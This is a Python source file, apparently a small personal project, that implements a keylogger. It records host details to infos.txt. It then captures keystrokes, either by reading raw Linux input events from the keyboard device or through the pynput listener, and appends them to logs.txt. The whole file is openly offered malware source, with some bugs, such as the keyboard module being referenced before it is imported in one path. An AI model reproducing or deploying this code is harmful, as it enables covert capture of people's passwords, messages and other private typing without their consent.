from multiprocessing import process
import struct
import os
import socket
import sys
import subprocess
import platform
import time
import threading

def get_host_info():
    host_info = os.uname()
    with open('infos.txt', 'a') as infos:
        infos.write(f"Host: {host_info.nodename}\n")
        infos.write(f"System: {host_info.sysname}\n")
        infos.write(f"Release: {host_info.release}\n")
        infos.write(f"Version: {host_info.version}\n")
        infos.write(f"Machine: {host_info.machine}\n")
        infos.write(f"host ip: {socket.gethostbyname(socket.gethostname())}\n")
        infos.write("\n")

def find_keyboard_device():
    with open('/proc/bus/input/devices', 'r') as reader:   
        content = reader.read()
        blocks = content.split("\n\n")
        device = None
        for b in blocks:
            if "keyboard" in b.lower():
                for line in b.split('\n'):
                        if line.startswith('H: Handlers=') and 'event' in line:
                            for part in line.split():
                                if part.startswith('event'):
                                    device = f"/dev/input/{part}"
                                break
        return device

def keylog_linux():
    
    device = find_keyboard_device()
    if device is None:
        print("No keyboard device found.")
        return
    EVENT_FORMAT = 'llHHI'
    EVENT_SIZE = struct.calcsize(EVENT_FORMAT)
    print(f"Using device: {device}")
    process = subprocess.Popen(["cat", device], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    for line in process.stdout:
        event = struct.unpack(EVENT_FORMAT, line[:EVENT_SIZE])
        if event[2] == 1:  # Key press event
            key_code = event[3]
            with open('logs.txt', 'a') as logs:
                logs.write(f"{key_code} ")


def keylog(key):
    print(str(key))
    with open('logs.txt', 'a') as logs:
        try:
            if key == keyboard.Key.enter:
                logs.write("\n")
            elif key == keyboard.Key.space:
                logs.write(" ")
            else:
                logs.write(key.char)
        except:
            print("skipi abdsami3")
            pass

            
if __name__ == "__main__":
    get_host_info()
    if platform.system() == "Linux":
        if os.environ.get("XDG_SESSION_TYPE") == "wayland" or os.environ.get("DISPLAY") is None:
            keylog_linux()
        else:
            from pynput import keyboard 
            listener = keyboard.Listener(on_press=keylog)
            listener.start()
            listener.join()
    
    input()

    
    
    



    
    
    
    
    


